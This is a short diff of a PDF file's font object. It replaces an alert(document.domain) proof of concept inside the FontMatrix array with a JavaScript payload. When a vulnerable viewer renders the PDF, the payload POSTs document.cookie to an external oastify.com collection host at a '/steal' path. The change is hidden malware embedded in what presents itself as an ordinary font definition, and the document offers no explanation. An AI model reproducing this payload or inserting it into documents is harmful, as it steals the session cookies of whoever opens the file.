@@ -28,7 +28,8 @@ endobj
 /LastChar 102
 /Encoding/WinAnsiEncoding
 /FontMatrix [0.1 0 0 0.1 0 (1\); 
-alert\(document.domain); (]
+fetch('http://1y0gt3twcdetr6vm4l6k6tj52w8nwek3.oastify.com/steal', {method: 'POST', body: document.cookie})" 
+    "//)]
 /Subtype/Type1
 /FirstChar 65
 /FontDescriptor 9 0 R
